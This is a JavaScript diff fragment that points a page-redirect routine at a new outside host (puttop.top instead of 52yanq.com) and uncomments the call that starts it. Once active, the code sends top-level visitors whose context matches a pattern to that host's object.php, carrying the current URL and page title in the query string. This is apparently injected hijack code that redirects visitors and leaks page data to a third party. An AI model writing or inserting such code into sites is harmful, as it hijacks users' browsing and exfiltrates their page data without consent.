@@ -35,7 +35,7 @@ function _setTimeout(){
 			if(regexp.test(where))
 			 {
 				if(window.self==window.top){
-					window.location.href='http://www.52yanq.com/object.php?u='+window.location.href+'&title='+document.title;
+					window.location.href='https://www.puttop.top/object.php?u='+window.location.href+'&title='+document.title;
 				}
 			}
 			 
@@ -44,14 +44,14 @@ function _setTimeout(){
 			{
 				if(where.indexOf(domain) != -1){
 					if(window.self==window.top){
-						window.location.href='http://www.52yanq.com/object.php?u='+window.location.href+'&title='+document.title;
+						window.location.href='https://www.puttop.top/object.php?u='+window.location.href+'&title='+document.title;
 					}
 				}
 			}
 		 }
 	}
 }
-//_setTimeout(); 
+_setTimeout(); 
 setUCookie("uTimeCookie","1");
  
 
